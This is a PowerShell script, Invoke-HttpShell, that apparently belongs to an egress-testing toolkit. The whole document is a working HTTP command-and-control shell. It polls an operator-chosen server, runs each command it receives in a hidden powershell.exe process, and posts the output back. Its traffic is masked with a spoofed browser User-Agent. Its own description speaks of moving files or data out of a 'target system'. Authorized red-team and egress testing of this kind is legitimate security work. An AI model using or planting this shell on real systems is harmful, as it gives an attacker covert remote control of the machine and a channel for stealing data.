function Invoke-HttpShell
{

<#

.Synopsis
    HTTP-Shell powershell client.

.Description
    This script will connect to an Egress-assess server and transfer faux Personally Identifiable Information or
    files from the target system.
    Due to processing overhead in Powershell, numbers are created in batches of 5,000.
    Reference: http://powershell.org/wp/2013/09/16/powershell-performance-the-operator-and-when-to-avoid-it/

.Parameter SERVER
    The string containing the server or hostname of the egress assess server

.Parameter PORT
    The string containing the port to communicate over

.Example
    Import-Module HTTP-Shell.ps1
    Invoke-HttpShell -SERVER 127.0.0.1 -PORT 80

#>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [string]$Server,
        [Parameter(Mandatory = $True)]
        [string]$Port
    )
    process
    {
        function Execute-Powershell ($command) {
            $startInfo = New-Object System.Diagnostics.ProcessStartInfo
            $startInfo.FileName = "powershell.exe"
            $startInfo.Arguments = $command, $null

            $startInfo.RedirectStandardOutput = $true
            $startInfo.UseShellExecute = $false
            $startInfo.CreateNoWindow = $true

            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $startInfo
            $process.Start() | Out-Null
            $standardOut = $process.StandardOutput.ReadToEnd()
            $process.WaitForExit()

            return $standardOut
        }

        $wc = New-Object -TypeName System.Net.WebClient

        $wc.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)")
        $wc.Headers.Add("Content-type", "application/x-www-form-urlencoded")
        $wc.Headers.Add("Accept", "text/plain")

        $sleep = 2

        while ($True) {
            $uri = "http://" + $Server + ":" + $Port + "/"
            $command = $wc.DownloadString($uri)
            if ($command) {
                if ($command -like "checkin") {
                    $results = "Checking in..."
                } elseif ($command -like "sleep *") {
                    $sleep = $command.split(' ')[1]
                    $results = "Sleep updated to $sleep"
                } elseif ($command -like "exit") {
                    break
                } else {
                    $results = Execute-Powershell $command
                }
                $wc.UploadString($uri + "index.aspx", "POST", $results)
                $command = $results = [string]::empty
            }
            Start-Sleep -Seconds $sleep
        }
    }
}
